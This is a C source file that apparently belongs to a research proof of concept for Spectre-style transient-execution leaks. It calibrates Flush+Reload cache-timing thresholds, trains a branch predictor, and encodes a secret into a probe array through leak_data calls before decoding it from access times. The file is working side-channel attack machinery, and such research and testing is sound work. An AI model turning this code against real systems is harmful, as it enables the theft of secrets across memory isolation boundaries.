#include "../include/transfer.h"

size_t access_flushed(uint8_t *address)
{
    clflush(address);
    lfence();
    mfence();
    return access_time(address);
}

size_t access_cached(uint8_t *address)
{
    maccess(address);
    lfence();
    mfence();
    return access_time(address);
}

size_t flush_flushed(uint8_t *address)
{
    clflush(address);
    lfence();
    mfence();
    return flush_time(address);
}

size_t flush_cached(uint8_t *address)
{
    maccess(address);
    lfence();
    mfence();
    return flush_time(address);
}

size_t get_average_time(size_t (*function_to_measure)(uint8_t *address))
{
    uint8_t addresses[NUMBER_OF_THRESHOLD_MEASUREMENTS * STRIDE];

    size_t measurements[NUMBER_OF_THRESHOLD_MEASUREMENTS];

    uint32_t rand_i;
    for (size_t i = 0; i < NUMBER_OF_THRESHOLD_MEASUREMENTS; i++)
    {
        rand_i = (((i) * 167) + 67) % NUMBER_OF_THRESHOLD_MEASUREMENTS;
        measurements[i] = function_to_measure(addresses + (rand_i * STRIDE));
    }

    size_t sum = 0;
    for (size_t i = 0; i < NUMBER_OF_THRESHOLD_MEASUREMENTS; i++)
    {
        sum += measurements[i];
        // printf("Flushed: %i\n", measurements[i]);
    }

    return sum / NUMBER_OF_THRESHOLD_MEASUREMENTS;
}

size_t get_threshold(uint8_t covert_channel)
{
    size_t flushed = get_average_time(access_flushed);
    size_t cached = get_average_time(access_cached);
    if (covert_channel == 0 || covert_channel == 42)
    {
        return cached + ((flushed - cached) / 2);
    }
    else if (covert_channel == 1)
    {
        return cached + ((flushed - cached) / 2);
    }
    else if (covert_channel == 2)
    {
        return cached + ((flushed - cached) / 2);
    }
}

bool is_cached_load(uint8_t *address, size_t threshold)
{
    size_t time = access_time(address);
    // lfence();
    // mfence();
    // printf("Address %zx cycles: %zu\n", address, time);
    if (time < threshold)
        return true;
    return false;
}

uint64_t transfer_bitwise(void (*asm_encode)(uint64_t data, uint8_t *channel,
                                             uint8_t bits_count, uint64_t stride),
                          uint64_t (*decode)(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold),
                          uint64_t in, size_t threshold, uint8_t bits_count, uint64_t stride, uint64_t train_data_length,
                          uint8_t covert_channel)
{
    uint32_t channel_len = STRIDE + ((bits_count + 2) * stride);
    // creating transfer array
    uint8_t side_channel[channel_len];
    uint32_t out_index = 0;
    bool training;

    uint32_t train_data[(train_data_length * stride) + 1];
    for (uint32_t i = 0; i < (train_data_length * stride) + 1; i += stride)
    {
        train_data[i] = i;
    }

    // empty the output
    uint64_t out = 0;

    memset(side_channel, 5, channel_len);

    clflush(&train_data[(train_data_length * stride)]);

    if (covert_channel == 0 || covert_channel == 2)
    {
        // flushing the transfer array, before encoding data into it
        for (uint32_t i = STRIDE; i < channel_len; i += stride)
            clflush(&side_channel[i]);
    }
    else
    {
        // loading the transfer array, before encoding data into it
        for (uint32_t i = STRIDE; i < channel_len; i += stride)
            prefetch(&side_channel[i]);
    }

    maccess(&in);

    lfence();
    mfence();

    // training the predictor
    if (train_data_length > 0)
    {
        for (uint32_t i = 0; i < (train_data_length * stride); i += stride)
        {
            // using 0 as secret, so no adresses are loaded into cache
            training = leak_data(asm_encode, i, train_data, train_data_length * stride, 0, side_channel + STRIDE, bits_count, stride);
            // printf("Training: %d\n", training);
        }
    }

    // writing secret into the side channel array
    training = leak_data(asm_encode, (train_data_length * stride), train_data, train_data_length * stride, in, side_channel + STRIDE, bits_count, stride);
    printf("Training: %d\n", training);

    return decode(side_channel + STRIDE, bits_count, stride, threshold);
}

uint64_t transfer_array_index(void (*asm_encode)(uint64_t data, uint8_t *channel,
                                                 uint8_t bits_count, uint64_t stride),
                              uint64_t (*decode)(uint8_t side_channel[], uint8_t bits_count, uint64_t stride, size_t threshold),
                              uint64_t in, size_t threshold, uint8_t bits_count, uint64_t stride, uint64_t train_data_length,
                              uint8_t covert_channel)
{
    size_t channel_array_size = (size_t)((powl(2, bits_count) + 3) * stride);
    // creating transfer array
    uint8_t side_channel[channel_array_size];
    uint32_t out_index = 0;
    bool training;

    uint32_t train_data[(train_data_length * stride) + 1];
    for (uint32_t i = 0; i < (train_data_length * stride) + 1; i += stride)
    {
        train_data[i] = i;
    }

    // empty the output
    uint64_t out = 0;

    memset(side_channel, 5, channel_array_size);

    clflush(&train_data[(train_data_length * stride)]);

    if (covert_channel == 0 || covert_channel == 2)
    {
        // flushing the transfer array, before encoding data into it
        for (uint32_t i = 0; i < channel_array_size; i += stride)
            clflush(&side_channel[i]);
    }
    else
    {
        // loading the transfer array, before encoding data into it
        for (uint32_t i = 0; i < channel_array_size; i += stride)
            prefetch(&side_channel[i]);
    }

    maccess(&in);

    lfence();
    mfence();

    // training the predictor
    if (train_data_length > 0)
    {
        for (uint32_t i = 0; i < (train_data_length * stride); i += stride)
        {
            // using 0 as secret, so no adresses are loaded into cache
            training = leak_data(asm_encode, i, train_data, train_data_length * stride, 0, side_channel, bits_count, stride);
            // printf("Training: %d\n", training);
        }
    }

    // writing secret into the side channel array
    training = leak_data(asm_encode, (train_data_length * stride), train_data, train_data_length * stride, in, side_channel, bits_count, stride);
    printf("Training: %d\n", training);

    return decode(side_channel, bits_count, stride, threshold);
}

uint64_t transfer_mixed(void (*asm_encode)(uint64_t data, uint8_t *channel,
                                           uint8_t n_b, uint8_t n_a, uint64_t bitmask, uint64_t stride),
                        uint64_t (*decode)(uint8_t side_channel[], uint8_t n_b, uint8_t n_a, uint64_t stride, size_t threshold),
                        uint64_t in, uint8_t *channel, size_t threshold, uint8_t n_b, uint8_t n_a, uint64_t stride, uint64_t train_data_length,
                        uint8_t covert_channel)
{
    size_t channel_array_size = (size_t)(((n_b * (powl(2, n_a) - 1)) + 3) * stride);
    // creating transfer array
    uint8_t side_channel[channel_array_size];
    uint32_t out_index = 0;
    bool training;

    uint64_t bitmask = 0;
    for (int i = 0; i < n_a; i++)
    {
        bitmask = bitmask << 1;
        bitmask += 1;
    }

    uint32_t train_data[(train_data_length * stride) + 1];
    for (uint32_t i = 0; i < (train_data_length * stride) + 1; i += stride)
    {
        train_data[i] = i;
    }

    // empty the output
    uint64_t out = 0;

    //prefetch(&side_channel);
    //printf("Training: address: %zu\n", side_channel);
    memset(side_channel, 5, channel_array_size);

    clflush(&train_data[(train_data_length * stride)]);

    if (covert_channel == 42)
    {
        // flushing the transfer array, before encoding data into it
        for (uint32_t i = 0; i < channel_array_size; i += stride)
            clflush(&side_channel[i]);
    }
    else
    {
        // loading the transfer array, before encoding data into it
        for (uint32_t i = 0; i < channel_array_size; i += stride)
            prefetch(&side_channel[i]);
    }

    maccess(&in);

    lfence();
    mfence();

    // training the predictor
    if (train_data_length > 0)
    {
        for (uint32_t i = 0; i < (train_data_length * stride); i += stride)
        {
            // using 0 as secret, so no adresses are loaded into cache
            training = leak_data_dynamic(asm_encode, i, train_data, train_data_length * stride, 0, side_channel+stride, n_b, n_a, bitmask, stride);
            //printf("Training: %d\n", training);
        }
    }

    // writing secret into the side channel array
    training = leak_data_dynamic(asm_encode, ((train_data_length) * stride), train_data, train_data_length * stride, in, side_channel+stride, n_b, n_a, bitmask, stride);
    printf("Training: %d\n", training);

    return decode(side_channel, n_b, n_a, stride, threshold);
}

uint64_t transfer_mixed_properties(void (*asm_encode)(uint64_t data, uint8_t *channel,
                                           uint8_t n_b, uint8_t n_a, uint64_t bitmask, uint64_t stride),
                        uint64_t (*decode)(uint8_t side_channel[], uint8_t n_b, uint8_t n_a, uint64_t stride, size_t threshold),
                        uint64_t in, uint8_t channel[], size_t threshold, uint8_t n_b, uint8_t n_a, uint64_t stride, uint64_t train_data_length,
                        uint8_t covert_channel)
{
    size_t channel_array_size = (size_t)(((n_b * (powl(2, n_a) - 1)) + 3) * stride);
    // creating transfer array
    uint8_t side_channel[channel_array_size];
    uint32_t out_index = 0;
    bool training;

    uint64_t bitmask = 0;
    for (int i = 0; i < n_a; i++)
    {
        bitmask = bitmask << 1;
        bitmask += 1;
    }

    uint32_t train_data[(train_data_length * stride) + 1];
    for (uint32_t i = 0; i < (train_data_length * stride) + 1; i += stride)
    {
        train_data[i] = i;
    }

    // empty the output
    uint64_t out = 0;

    //printf("Channel address: %zu\n", side_channel);
    memset(side_channel, 5, channel_array_size);

    clflush(&train_data[(train_data_length * stride)]);

    int c = 0;
    size_t start = rdtsc();

    if (covert_channel == 42)
    {
        // flushing the transfer array, before encoding data into it
        for (uint32_t i = 0; i < channel_array_size; i += stride)
        {
            c++;
            clflush(&side_channel[i]);
        }
    }
    else
    {
        // loading the transfer array, before encoding data into it
        for (uint32_t i = 0; i < channel_array_size; i += stride)
            prefetch(&side_channel[i]);
    }

    printf("props;%zu;%zu;", c, rdtsc() - start);

    maccess(&in);

    lfence();
    mfence();

    c = 0;
    start = rdtsc();
    // training the predictor
    if (train_data_length > 0)
    {
        for (uint32_t i = 0; i < (train_data_length * stride); i += stride)
        {
            c++;
            // using 0 as secret, so no adresses are loaded into cache
            training = leak_data_dynamic(asm_encode, i, train_data, train_data_length * stride, 0, side_channel+stride, n_b, n_a, bitmask, stride);
            //printf("Training: %d\n", training);
        }
    }

    printf("%zu;%zu;", c, rdtsc() - start);

    // writing secret into the side channel array
    start = rdtsc();
    training = leak_data_dynamic(asm_encode, ((train_data_length) * stride), train_data, train_data_length * stride, in, side_channel+stride, n_b, n_a, bitmask, stride);
    printf("%zu;", rdtsc() - start);

    start = rdtsc();
    uint64_t result = decode(side_channel, n_b, n_a, stride, threshold);
    printf("%zu\n", rdtsc() - start);
    printf("Training: %d\n", training);
    return result;
}